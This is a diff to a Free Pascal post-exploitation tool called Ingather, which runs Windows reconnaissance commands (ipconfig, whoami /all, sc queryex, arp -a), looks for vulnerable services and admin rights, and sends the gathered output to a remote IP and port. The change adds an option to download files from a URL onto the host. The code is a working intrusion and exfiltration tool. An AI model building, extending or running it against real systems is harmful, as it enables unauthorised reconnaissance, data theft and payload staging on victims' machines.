@@ -3,7 +3,7 @@ program Ingather;
 {$mode objfpc}{$H+}
 
 uses
-  Classes, SysUtils, CustApp, RunAs, NetSend, FindVulns, RunCMD
+  Classes, SysUtils, CustApp, RunAs, NetIO, FindVulns, RunCMD
   { you can add units after this };
 
 type
@@ -24,13 +24,13 @@ type
 procedure TIngather.DoRun;
 const
   NUM_CMDS = 5;
-  CMD : array[1..NUM_CMDS] of string = ('ipconfig /all','ver','sc queryex' ,'whoami /all','arp -a');
+  CMD      : array[1..NUM_CMDS] of string = ('ipconfig /all','ver','sc queryex' ,'whoami /all','arp -a');
 var
   ErrorMsg     : String;
   ip           : AnsiString;
   port         : AnsiString;
   outfile      : AnsiString;
-  SendOutput   : TNetSend;
+  nwrk         : TNetIO;
   escalate     : TRunAs;
   vulns        : TFindVulns;
   OutputStream : TStream;
@@ -38,11 +38,13 @@ var
   x            : Integer;
   output       : AnsiString;
   tfOut        : TextFile;
+  download     : String;
+  save         : String;
 begin
   output := ''; // initialize the string
 
   // quick check parameters
-  ErrorMsg:=CheckOptions('hipo','help ip port out');
+  ErrorMsg:=CheckOptions('dehipos','download enum help ip out port save');
   if ErrorMsg <> '' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -50,53 +52,66 @@ begin
   end;
 
   // parse parameters
-  if HasOption('h','help') then begin
+  if HasOption('h','help') or (ParamCount = 0) then begin
     WriteHelp;
     Terminate;
     Exit;
   end;
 
-  vulns := TFindVulns.Create;
-  execute := TRunCMD.Create;
-  for x:= 1 to NUM_CMDS do begin
-    OutputStream := execute.Run(CMD[x]);
-    output := concat(output, vulns.StreamToString(OutputStream));
-  end;
-  vulns.getVulnServices(Output);
-  execute.Free;
-  vulns.Free;
-
-  // Is user an admin
-  escalate := TRunAs.Create;
-  if escalate.IsUserAdmin then
-    writeln('You are an admin!!!')
-  else
-    writeln('User is not an admin!!!');
-  {if escalate.RunAsAdmin(0, 'whoami', '/all') then
-    writeln('You are not an admin!!!')
-  else
-    writeln('Did not run as admin!!!');}
-  escalate.Free;
-
-  // Send output to another computer?
-  if HasOption('i','ip') and HasOption('p','port') then begin
-    ip := Self.GetOptionValue('i','ip');
-    port := Self.GetOptionValue('p','port');
-    SendOutput := TNetSend.Create;
-    SendOutput.SendIt(ip, port, output);
-    SendOutput.Free;
+  // download file and exit
+  if HasOption('d','download') and HasOption('s','save') then begin
+    nwrk := TNetIO.Create;
+    download := Self.GetOptionValue('d','download');
+    save := Self.GetOptionValue('s','save');
+    nwrk.GetIt(download, save);
+    nwrk.Free;
   end;
 
-  // Now that all data has been read it can be used; for example to save it to a file on disk
-  if HasOption('o','out') then begin
-    outfile := Self.GetOptionValue('o','out');
-    AssignFile(tfOut, outfile);
-    rewrite(tfOut);
-    writeln(tfOut, output);
+  // do vulnerability enumeration on host
+  if HasOption('e','enum') then begin
+    vulns := TFindVulns.Create;
+    execute := TRunCMD.Create;
+    for x:= 1 to NUM_CMDS do begin
+      OutputStream := execute.Run(CMD[x]);
+      output := concat(output, vulns.StreamToString(OutputStream));
+    end;
+    vulns.getVulnServices(Output);
+    execute.Free;
+    vulns.Free;
+
+    // Is user an admin
+    escalate := TRunAs.Create;
+    if escalate.IsUserAdmin then
+      writeln('You are an admin!!!')
+    else
+      writeln('You are not an admin.');
+    {if escalate.RunAsAdmin(0, 'whoami', '/all') then
+      writeln('You are not an admin!!!')
+    else
+      writeln('Did not run as admin!!!');}
+    escalate.Free;
+
+    // Send output to another computer?
+    if HasOption('i','ip') and HasOption('p','port') then begin
+      nwrk := TNetIO.Create;
+      ip := Self.GetOptionValue('i','ip');
+      port := Self.GetOptionValue('p','port');
+      nwrk.SendIt(ip, port, output);
+      nwrk.Free;
+    end;
+
+    // Write all command outputs to file?
+    if HasOption('o','out') then begin
+      outfile := Self.GetOptionValue('o','out');
+      AssignFile(tfOut, outfile);
+      rewrite(tfOut);
+      writeln(tfOut, output);
+    end;
+
+    // Clean up
+    OutputStream.Free;
   end;
 
-  // Clean up
-  OutputStream.Free;
   Terminate;
 end;
 
@@ -114,11 +129,19 @@ end;
 procedure TIngather.WriteHelp;
 begin
   writeln;
-  writeln('Usage: Ingather.exe -i 1.1.1.1 -p 4444 -o output.txt');
-  writeln('-h --help  : print this help message');
-  writeln('-i --ip    : destination IP address');
-  writeln('-p --port  : destination port');
-  writeln('-o --out   : write to file');
+  writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
+  writeln('       Ingather.exe --download http://www.abcded.com/abc.txt --save c:\temp\abc.text');
+  writeln;
+  writeln('Download file:');
+  writeln('       -d --download    : download file');
+  writeln('       -s --save        : location to save downloaded file to');
+  writeln('Enumerate vulnerabilities:');
+  writeln('       -e --enum        : enumerate host vulnerabilities');
+  writeln('Output options:');
+  writeln('       -h --help        : print this help message');
+  writeln('       -i --ip          : destination IP address');
+  writeln('       -p --port        : destination port');
+  writeln('       -o --out         : write enumeration command outputs to file');
 end;
 
 var
